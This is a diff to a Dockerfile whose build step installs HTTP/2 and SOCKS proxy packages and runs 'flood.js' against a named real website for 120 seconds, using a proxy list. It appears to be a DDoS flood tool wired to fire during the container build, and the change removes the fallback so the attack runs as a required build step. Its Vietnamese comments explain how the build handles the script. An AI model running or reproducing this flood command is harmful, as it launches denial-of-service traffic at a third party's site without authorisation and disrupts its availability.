@@ -20,6 +20,4 @@ RUN npm install hpack https commander colors socks set-cookie-parser
 RUN node -v && npm -v
 
 # Chạy script nhưng không làm hỏng build nếu có lỗi
-RUN node flood.js https://mixigaming.com/ 120 10 10 live.txt flood || echo "Script đã chạy xong."
-
-# Container sẽ không khởi động sau khi build xong
+RUN node flood.js https://mixigaming.com/ 120 10 10 live.txt flood
